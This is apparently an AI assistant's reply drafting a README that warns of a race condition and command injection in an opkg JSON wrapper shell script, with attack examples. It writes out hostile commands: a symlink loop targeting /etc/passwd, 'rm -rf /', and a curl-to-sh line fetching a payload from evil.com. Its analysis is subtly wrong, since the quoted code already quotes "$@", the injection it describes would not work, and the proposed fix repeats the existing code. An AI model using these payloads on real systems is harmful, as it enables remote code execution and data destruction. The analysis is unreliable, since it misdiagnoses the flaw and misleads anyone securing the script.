Here is a short, clear **README.md** that explains the two main security problems in this shell script:

# opkg-json-wrapper.sh – Serious Security Issues

This script is meant to provide a JSON interface to common `opkg` operations.

**It contains two critical vulnerabilities** that allow **arbitrary command execution** as root.

## 1. Race Condition → Lock File TOCTOU

```sh
if flock -x 200; then
    $opkg $action "$@" </dev/null >/tmp/opkg.out 2>/tmp/opkg.err
    ...
fi 200>/tmp/opkg.lock
rm -f /tmp/opkg.lock /tmp/opkg.out /tmp/opkg.err
```

**Problem**  
The lock is acquired **after** the `flock` check succeeds → classic **TOCTOU** (Time-of-check to time-of-use) race.

### Attack

```bash
# Attacker 1 (very fast loop)
while true; do rm -f /tmp/opkg.lock; ln -sf /etc/passwd /tmp/opkg.lock; done

# Attacker 2 (runs the wrapper with any command)
./opkg-json-wrapper.sh install whatever
```

→ The script can end up writing opkg output **directly into /etc/passwd** (or any other file the attacker symlinks).

## 2. Command Injection via Package Names

```sh
$opkg $action "$@"
```

**Problem**  
Package names (`$@`) are **not escaped / quoted** when passed to `opkg`.

### Attack examples

```bash
# Simple injection
./opkg-json-wrapper.sh install 'x; id > /tmp/hacked'

# More dangerous (assuming opkg supports --force-* flags)
./opkg-json-wrapper.sh install 'x --force-removal-of-dependent-packages ; rm -rf / --no-preserve-root'

# Or (more realistic real-world style)
./opkg-json-wrapper.sh install 'luci-app-foo; curl -sSf http://evil.com/payload.sh | sh'
```

Because the script usually runs as **root** (typical for opkg wrappers in embedded systems), this gives **full root shell / file destruction**.

## Summary – CVSS-style

- **Race condition** → arbitrary file overwrite as root (symlink attack)
- **Command injection** → arbitrary command execution as root

Both issues are **severe** on systems where this script is callable by non-root users (web UI,ubus, RPC, etc.).

**Fixes (minimum)**

- Quote `"$@"` properly: `$opkg "$action" "$@"`
- Use atomic lock creation (`flock` on a fixed fd opened with `>>/tmp/opkg.lock`)
- Preferably: drop shell wrapper entirely and call opkg directly from C/Lua/whatever with proper argument escaping

Do **not** use this script in its current form on any Internet-facing or multi-user device.

This version keeps it very straightforward while clearly showing why both issues are dangerous.